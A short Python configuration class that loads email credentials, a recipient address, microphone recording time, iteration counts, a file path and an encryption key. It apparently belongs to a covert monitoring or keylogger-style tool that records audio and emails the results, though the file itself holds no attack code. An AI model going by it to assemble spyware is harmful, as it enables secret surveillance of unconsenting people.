import os
from dotenv import load_dotenv

class Config:
    def __init__(self):
        load_dotenv()  # Load environment variables from .env file
        self.email_address = os.getenv("EMAIL_ADDRESS")
        self.password = os.getenv("EMAIL_PASSWORD")
        self.toaddr = os.getenv("TO_ADDRESS")
        self.microphone_time = int(os.getenv("MICROPHONE_TIME", 10))
        self.time_iteration = int(os.getenv("TIME_ITERATION", 15))
        self.number_of_iterations_end = int(os.getenv("NUMBER_OF_ITERATIONS_END", 3))
        self.file_path = os.getenv("FILE_PATH")

        if self.file_path is None:
            raise ValueError("FILE_PATH is not set in the .env file")

        self.extend = "\\"
        self.file_merge = self.file_path + self.extend

        # Ensure the encryption key is loaded from the file
        with open("encryption_key.txt", "rb") as file:
            self.encryption_key = file.read()
